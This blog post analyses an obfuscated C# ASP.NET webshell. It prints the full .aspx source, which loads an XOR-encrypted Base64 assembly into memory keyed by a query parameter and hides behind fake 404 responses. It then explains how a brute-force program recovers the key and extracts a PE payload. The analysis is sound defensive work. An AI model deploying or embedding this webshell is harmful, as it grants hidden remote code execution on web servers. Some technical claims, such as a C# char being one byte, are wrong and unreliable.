---
layout: post
title:  "Brute-Force for generate a key to decrypt payload of a webshell"
---



A webshell is a dangerous tool in the hands of a threat actor, as it can be used to carry out a range of malicious tasks on an infected machine. In this article, I will focus on a webshell that contains an XOR encrypted payload with unknown key.

XOR encryption, also known as exclusive or encryption, is a type of encryption method that involves applying the XOR (exclusive or) logical operation between two sets of data. In this encryption method, each bit in the plaintext (the original message to be encrypted) is paired with a corresponding bit in a key (a random string of bits used for encryption) and the XOR operation is applied between the two bits. The resulting output is the ciphertext (the encrypted message).

Decryption is done by applying the XOR operation between the ciphertext and the key.

In XOR encryption, the key is a secret value that is used to encrypt and decrypt the plaintext. The key is combined with the plaintext using the XOR operator to produce ciphertext. To decrypt the ciphertext, the same key is used with the XOR operator again.

The key can be any length as long as it is equal in length to the plaintext. In this webshell, the key is   a 4 byte integer, and the same integer is used for decrypting every character.

Through this article, we will gain valuable insights into how C# .NET webshells work and how they can be decrypted even if the key is unknown.

---

## Webshell Demonstration

This article will explore a specific type of webshell, which is written in C# .NET programming language. as following the webshell: 

```csharp
<%@ Page Language="C#" ValidateRequest="false" Debug="false" Trace="false" %>

<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.IO" %>

<script language="c#" runat="server">
    string kOljc0dVRP(string pppText, int ppppEncKey)
    {
        StringBuilder JiCQM17Tfv = new StringBuilder(pppText);
        StringBuilder wYdwDAYvyv = new StringBuilder(pppText.Length);
        char c2TxEJ0uqP;
        for (int i = 0; i < pppText.Length; i++)
        {
            c2TxEJ0uqP = JiCQM17Tfv[i];
            c2TxEJ0uqP = (char)(c2TxEJ0uqP ^ ppppEncKey); //this deycrept
            wYdwDAYvyv.Append(c2TxEJ0uqP);
        }
        return wYdwDAYvyv.ToString();
    }

    void Page_Load(object sender, EventArgs e)
    {
        try
        {
            if (Request.QueryString["aps"] != null && !string.IsNullOrEmpty(Request.QueryString["aps"]))
            {
                string xhxeZjRc0R = "xafFpcWCxaLFssWyxb7FssWyxbLFssW2xbLFssWyxbLEnMScxIvFssWyxb/FlMWyxbLFssWyxbLFssWyxbLFssWixbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWUxbLFssWyxbLFssSHxZXFhsWUxIfFssWHxbLFncW9xbrFkcWUxbHFp8W+xIPFm8WlxbTFm8WDxZDFisWxxYTFkMWexIrFncWQxZ7FtcWHxbrFtMW9xZvFkcWexIbFhcWXxbDFscWaxanFoMWxxYrFl8WkxIfFlMWSxaTEh8WUxaHFtsSKxafFusW0xILFhcWpxbTFpsWGxbfFosSDxbjFucWyxbLFssWyxbLFssWyxbLFssWxxaLFocWixbLFssWnxbLFtsW3xbLFtsWbxIvFicWexb7FssWyxbLFssWyxbLFssWyxbLFssW8xbLFssWyxZrFtsW/xbLFosWUxbLFssWxxZTFssWyxbLFssW0xbLFssWyxbLFssWyxbLFssWVxZnFkMWyxbLFssWyxZTFssWyxbLFssWixbLFssWyxbLFssWxxbLFssWyxbLFlMWyxbLFssWyxbLFlMWyxbLFscWyxbLFssWyxbLFssWyxbLFssWyxbbFssWyxbLFssWyxbLFssWyxbLFssWwxbLFssWyxbLFssWyxZTFssWyxbLFssWyxbLFssWyxb7FssWixbrFpsWyxbLFscWyxbLFssWxxbLFssWyxbLFssWyxbbFssWyxbLFtsWyxbLFssWyxbLFssWyxbLFscWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWwxYTEgMWyxbLFscWjxbLFssWyxbLFssW2xbLFssWyxb/FlMWwxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFtMWyxbLFssWyxYTFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFusWyxbLFssWwxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbDFsMWyxbLFssW2xZTFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbDEhsSDxanFq8WbxIPFssWyxbLFssWbxbHFkMWyxbLFssWyxZTFssWyxbLFssW0xbLFssWyxbLFssW6xbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbDFssWyxbLFtMWyxYbFkMWdxb3FisWqxYTFssWyxbLFv8WUxbDFssWyxbLFssWixbLFssWyxbLFssWixbLFssWyxbLFksWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWxxbLFssWyxbHFssW/xZ3FucWfxZHFtMSKxZnFssWyxbLFvsWyxbLFssWyxbLFtMWyxbLFssWyxbLFsMWyxbLFssWyxbvFlMWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWixbLFssWyxaLFlMWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFscWUxb3FhMWyxbLFssWyxbLFssWyxbbFlMWyxbLFssWyxbDFssWyxabFssW7xbDFlMWyxbLFscWyxaPFssWyxbLFscWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxI4=";
                Assembly YQ3anGpDUo = Assembly.Load(Convert.FromBase64String(kOljc0dVRP(Encoding.UTF8.GetString(Convert.FromBase64String(xhxeZjRc0R)), Convert.ToInt32(Request.QueryString["aps"]))));
                Page rYi7ZNO5uo = (Page)Activator.CreateInstance(YQ3anGpDUo.GetTypes()[0]);
                rYi7ZNO5uo.ProcessRequest(HttpContext.Current);
            }else
            {
                Response.TrySkipIisCustomErrors = Convert.ToBoolean(1);
                Response.StatusCode = 404;
            }
        }
        catch
        {
            Response.TrySkipIisCustomErrors = true;
            Response.StatusCode = 404;
        }
    }
</script>
```

### First Function `kOljc0dVRP`

The first part of the webshell is `kOljc0dVRP` function, where includes a two arguments `string pppText`  and `int ppppEncKey.`

The first argument `pppText` is a string encoded in ***UTF***-***16,*** each character is represented as two bytes **`00 00`** UTF-16 is commonly used in C# because it is the default encoding for the .NET Framework, which C# is built upon.

The second argument **`ppppEncKey`** is an integer which is used as a key to decrypt the string in the first argument.

The variables used in the **`kOljc0dVRP`** function are as follows:

- `StringBuilder JiCQM17Tfv = new StringBuilder(pppText);`

**`StringBuilder`** is a class in .NET used for efficient string manipulation and acting as container of  a string. In the context of a webshell, it can be used by threat actors to construct malicious payloads as an internal buffer to store string data or any string. Based on MSDN, the capacity of the buffer is initially set to 16 characters, but it can automatically resize itself to accommodate larger strings. The `JiCQM17Tfv` variable is acting as input stream.

- `StringBuilder wYdwDAYvyv = new StringBuilder(pppText.Length);`

 Declare a new instance object from the class StringBuilder **`wYdwDAYvyv`** and initialize it with a buffer capacity equal to the length of the input string **`pppText`**. 

The StringBuilder object with the variable name `wYdwDAYvyv`  will be utilized for the purpose of appending characters to the buffer.

- `char c2TxEJ0uqP;`

The variable **`c2TxEJ0uqP`** has been created with the data type **`char`** , which occupies one byte (8 bits) of memory in C#. Therefore, the variable can hold a single character from the Unicode ASCII character set, but only occupies a small amount of memory to store its value. 

```csharp
for (int i = 0; i < pppText.Length; i++){
        {
            c2TxEJ0uqP = JiCQM17Tfv[i]; // c2TxEJ0uqP is char && JiCQM17Tfv UTF-16
            c2TxEJ0uqP = (char)(c2TxEJ0uqP ^ ppppEncKey); 
            wYdwDAYvyv.Append(c2TxEJ0uqP);
        }
        return wYdwDAYvyv.ToString(); 
	}
```

To process the input, the program will iterate through it using a loop based on the size of the buffer. During this process, the **`JiCQM17Tfv`** string will be appended to the **`c2TxEJ0uqP`** string. It's important to note that **`JiCQM17Tfv`** is represented in UTF-16 format, which means that each character is represented by two bytes. Each two-byte character will be converted into one byte, effectively discarding the second byte and retaining the second. For instance, if we have the character **A** in UTF-16 format, it is represented by **`0x0041`** in Little Endian, which is two bytes. When it is appended to **`c2TxEJ0uqP`**, the second byte (0x00) will be ignored, and the first byte (0x41) will be appended. The casting here is implicit.

In addition, the result of the operation will be appended to the string **`c2TxEJ0uqP`**. The operation **`(char)(c2TxEJ0uqP ^ ppppEncKey)`** involves performing an XOR operation, which is a commonly used cryptographic technique. Since **`ppppEncKey`** is represented as an integer and requires **explicit casting**, the **`(char)`** casting is utilized. This is because **`c2TxEJ0uqP`** is only one byte, whereas an integer is represented using four bytes.

**`wYdwDAYvyv.Append(c2TxEJ0uqP);`** will append the one byte char value of  **`c2TxEJ0uqP`** to the buffer **`wYdwDAYvyv`**. **`c2TxEJ0uqP`** represents a single byte, which will be appended as two bytes.

After the buffer **`wYdwDAYvyv`**  is modified by the **`Append()`** function, it will contain the appended bytes. The **`ToString()`** function will convert the buffer to a string representation of its contents.

### Second Function

```csharp
void Page_Load(object sender, EventArgs e)
    {
        try
        {
            if (Request.QueryString["aps"] != null && !string.IsNullOrEmpty(Request.QueryString["aps"]))
            {
                string xhxeZjRc0R = "xafFpcWCxaLFssWyxb7FssWyxbLFssW2xbLFssWyxbLEnMScxIvFssWyxb/FLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxI4=";//cut the payload
                Assembly YQ3anGpDUo = Assembly.Load(Convert.FromBase64String(kOljc0dVRP(Encoding.UTF8.GetString(Convert.FromBase64String(xhxeZjRc0R)), Convert.ToInt32(Request.QueryString["aps"]))));
                Page rYi7ZNO5uo = (Page)Activator.CreateInstance(YQ3anGpDUo.GetTypes()[0]);
                rYi7ZNO5uo.ProcessRequest(HttpContext.Current);
            }else
            {
                Response.TrySkipIisCustomErrors = Convert.ToBoolean(1);
                Response.StatusCode = 404;
            }
        }
```

The second function represents an instance of the **`WebForm1`** class object. This function is called **`Page_Load`**, and it is a server-side event method that belongs to the **[ASP.NET](http://asp.net/)** framework. 

The **`Page_Load`** method is executed every time a page is loaded at runtime. It is used to initialize the page and its controls and to perform any necessary pre-processing before the page is displayed to the user.

- The **`Request.QueryString["aps"]`** code is used in ASP.NET to retrieve the value of a query string parameter named "aps" from the current HTTP request's query string. The query string is the part of the URL that comes after the "?" character and contains key-value pairs separated by "&" character.

So, if the URL of the current HTTP request is **`http://www.contoso.com/default.aspx?aps=222&name=Hamad`**, then **`Request.QueryString["aps"]`** would return "222", and **`Request.QueryString["name"]`** would return "Hamad". 

- On other hand, as part of the function there exists variable that acts as an array called  `xhxeZjRc0R` , which contains the payload, however, the payload is heavily obfuscated and has a larger size, as shown in Figure 1.

![Figure 1: The obfuscated payload](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Brute-ForceWebshell/Untitled.png)

Figure 1: The obfuscated payload

- `Assembly YQ3anGpDUo = Assembly.Load(Convert.FromBase64String(kOljc0dVRP(Encoding.UTF8.GetString(Convert.FromBase64String(xhxeZjRc0R)), Convert.ToInt32(Request.QueryString["aps"]))));`

In addition, the function creates a new instance object called **`YQ3anGpDUo`** from the **`Assembly`** class, which contains the **`Assembly.Load`** method. This method is responsible for loading compiled files, such as .dll and .exe, into memory without modifying the file system. The loaded assembly can be accessed for its metadata and types, and it also allows for dynamic code execution. It loads the payload from memory.

However, by breaking down the obfuscated payload into parts, it becomes easier to understand:

- `var a1` = `Convert.FromBase64String(xhxeZjRc0R); //from string to binary(UTF-8)`

The code **`var a1 = Convert.FromBase64String(xhxeZjRc0R);`** will take the string **`xhxeZjRc0R`** as input, which is encoded in Base64 format. The **`Convert.FromBase64String`** method will then decode this Base64 string and convert it into a binary format, and the resulting binary data will be stored in the variable **`a1`**. Essentially, **`a1`** will contain the original data that was encoded in Base64 format in the string **`xhxeZjRc0R`**, but now it will be in binary format instead of string format.

- `var a2` = `Encoding.UTF8.GetString(**a1**); //Convert from from binary to string object (UTF16).`

The code **`var a2 = Encoding.UTF8.GetString(a1);`** will take the binary data that is stored in the variable **`a1`** and convert it into a UTF-16 string from the UTF-8 encoding. The binary `a1` is treated as UTF-8.

The **`Encoding.UTF8`** property is an instance of the **`Encoding`** class that represents the UTF-8 character encoding. The **`GetString`** method of this class is used to decode a byte array into a string using the specified encoding.

So, **`a2`** will contain the string representation of the original data that was stored in the byte array **`a1`**, and this string will be encoded using the UTF-16 encoding. 

- `var key` = `Convert.ToInt32(Request.QueryString["aps"]) // convert string to number`

The key is accessed using `Request.QueryString["aps"]` and then converted to 32-bit integer by passing it to `Convert.ToInt32`.

- `var a3 = kOljc0dVRP(a2, key); // decrypt the UTF-16 strin`

The previously mentioned `kOljc0dVRP` function is called, the string `a2` is in UTF16 format and passed as the first argument, while the second argument is used for the key. The Result `a3` is base64 string. 

- `var v4` = `Convert.FromBase64String(a3);`

This line of code performs a conversion of the string **`a3`** into binary format using the **`FromBase64String`** method provided by the **`Convert`** class.ary. 

- `var v5` = `Assembly.Load(v4);`

The final step of this function is to load the compiled binary into memory for execution. This is achieved through the use of the **`Assembly.Load(v4)`** method, which loads the assembly represented by the binary file specified in the **`v4`** variable and returns an instance of the **`Assembly`** class, which can be used to access the types and resources contained within the assembly. The returned **`Assembly`** instance is then assigned to the variable **`v5`** for further use in the program.

> To provide a clearer understanding of this operation, an example will be used. Let's consider the encrypted payload and illustrate the steps performed on it:
> 
1. Decode the first base64 and the result is UTF-8 binary (2 bytes = 1 character)
2. Convert UTF-8 binary to UTF-16 string
3. Take the UTF-16 string and decrypt it with the XOR function
4. Decode the UTF-16 string as base64 and you get PE file.

- **Step 1: `var a1` = `Convert.FromBase64String(xhxeZjRc0R);`**

Obtain the input string as UTF-8 and convert to binary.

![Figure 2: UTF-8 encoded binary](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Brute-ForceWebshell/Untitled%201.png)

Figure 2: UTF-8 encoded binary

Figure 2 depicts that the hex file contains UTF-8 encoded binary. For instance, the hexadecimal bytes **C5 A7 C5 A5** at the beginning of the file represents two characters due to UTF-8 encoding. Although, it is two character, it is encoded as four bytes in UTF-8, refer to Figure 3.

![Figure 3: Two UTF-8 bytes are decoded and retrieves a single character](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Brute-ForceWebshell/Untitled%202.png)

Figure 3: Two UTF-8 bytes are decoded and retrieves a single character

- **Step 2: `var a2` = `Encoding.UTF8.GetString(a1);`**

In this operation, the UTF-8 binary will be converted to UTF-16 string. For instance, converting the first character to from UTF-8 to UTF-16 is as following:

![Figure 4: One UTF-8 charater is encoded to UTF-16](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Brute-ForceWebshell/Untitled%203.png)

Figure 4: One UTF-8 charater is encoded to UTF-16

The UTF-8 character `**ŧť`** is encoded to UTF-16 bytes **`(0x167, 0x165)`  .** 

- **Step 3: `var a3` = `kOljc0dVRP(a2, Convert.ToInt32(Request.QueryString["aps"]));`**

The UTF-16 string will be decrypted with key (0x133) using casting and XOR. Here are the steps:

***Note: The XOR key was obtained through brute force attack, explained later in the article***.

```csharp
- casting each UTF-16 charcter to one byte: {**0x0167 => 0x67 || 0x0165 => 0x65}**
 

```

![Figure 5: The XOR operation with key 0x133](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Brute-ForceWebshell/Untitled%204.png)

Figure 5: The XOR operation with key 0x133

```csharp
**casting xor result to 1 byte for two characters:** **0x154 => 0x54, 0x156 => 0x56
Encode the result to UTF-16 (Little Endian format): 0x54 => 0x5400, 0x56 => 0x5600**
```

The final result **0x5400 & 0x5600** is the UTF-16. Refer to Figure 6.

![Figure 6: Decoding UTF16 back to string](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Brute-ForceWebshell/Untitled%205.png)

Figure 6: Decoding UTF16 back to string

- **Step 4: `var v4` = `Convert.FromBase64String(a3); //conver from srting to binary`**

Decode the base64 to binary. The binary is a malicious PE file. 

![Figure 7: The first byte of the PE file.](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Brute-ForceWebshell/Untitled%206.png)

Figure 7: The first byte of the PE file.

---


## Program to perform a multi-threaded brute-force attack to find the key used in the XOR algorithm

The algorithm works by generating all possible combinations of characters for the key and testing each combination against the encrypted payload. 

To find the key, a brute force approach can be used, which involves trying every possible combination until the correct key is found. I have written a C/C++ algorithm code to perform this task, using a multi-threaded approach to expedite the process.

---

## Methodology

The process is split into multiple threads, each handling a different range of characters for the key, in order to make use of the available processing power and speed up the search.

The code is designed to run on a powerful machine with multiple cores or processors, allowing it to efficiently handle the large number of calculations required to brute force the key. It is recommended to use a VM with enough resources 

However, it is important to note that this approach can still take a significant amount of time, depending on the length and complexity of the key.

Overall, the use of a multi-threaded brute force algorithm can be an effective way to decrypt webshell payloads and uncover the malicious activity being carried out by threat actors. 

---

## Brute Forec Program Tool Demonstration

In this program, inside the main function, the b64decode_ex function is called first to decode the base64 to binary. Since the binary is in UTF8 format, the UTF8 is encoded to UTF16 by calling “ConvertUTF8ToUTF16” function, the result is a UTF16 string, However, it is encrypted with a key. 

In order to find the key, a bruteforce attack must be performed. A specific number of threads are created on the machine using the “std::thread” class. The “searchForKey” is executed for the thread. In each thread, different combinations of keys are tried in a while loop. The global key variable “current_key” is used, and its type is “std::atomic”. It is incremented using “fetch_add(1)” method to prevent the threads of using the same key more than once.

The key is checked by attempting to decrypt the UTF16 string and then decoding the string as base64. If the result of the base64 contains the bytes 0x4D 0x5A, then it means the correct key has been found and the “searchForKey” returns for the thread, otherwise the while loop inside the function will continue to look for the key.

```c
Found bytes: 4d 5a = MZ
Found the key = 819
Found the key = 1843
Found the key = 1587
Found the key = 307
Found the key = 51
Found the key = 1075
Found the key = 563
Found the key = 1331
```

The Figure 8, depicts the output result of the brute force combinations, which the results as the following: 

![Figure 8: Output brute force program. ](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Brute-ForceWebshell/Untitled%207.png)

Figure 8: Output brute force program. 

![Figure 9: The PE file after decrypting with the key.](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Brute-ForceWebshell/Untitled%208.png)

Figure 9: The PE file after decrypting with the key.

## 

![Figure 10: The payload extracted from the webshell.](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Brute-ForceWebshell/Untitled%209.png)

Figure 10: The payload extracted from the webshell.

---

## Brute force program tool:
For more details on how the code is sturctured, feel free to take a look at the repo   [here](https://github.com/darksys0x/HM1-webshell-bruteForce)